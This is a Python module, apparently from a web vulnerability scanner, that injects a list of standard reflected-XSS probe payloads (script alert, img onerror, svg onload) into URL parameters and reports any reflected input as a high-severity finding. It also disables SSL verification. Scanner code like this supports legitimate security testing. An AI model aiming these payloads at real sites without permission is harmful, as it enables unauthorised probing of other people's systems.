import aiohttp
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "';alert(1);//",
    "\"-alert(1)-\"",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
]

def check_xss(url):
    vulnerabilities = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        return vulnerabilities
    
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
            
            try:
                async def fetch_test():
                    async with aiohttp.ClientSession() as session:
                        async with session.get(test_url, ssl=False) as response:
                            return await response.text()
                
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                content = loop.run_until_complete(fetch_test())
                loop.close()
                
                # Check if payload is reflected
                if payload in content:
                    vulnerabilities.append({
                        "title": f"Reflected XSS in parameter '{param}'",
                        "description": f"Parameter '{param}' reflects user input without proper sanitization",
                        "severity": "high",
                        "cvss_score": 7.5,
                        "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
                        "url": test_url,
                        "method": "GET",
                        "payload": payload,
                        "evidence": "Payload reflected in response"
                    })
                    break
            
            except Exception as e:
                continue
    
    return vulnerabilities

def scan_xss(url):
    return check_xss(url)
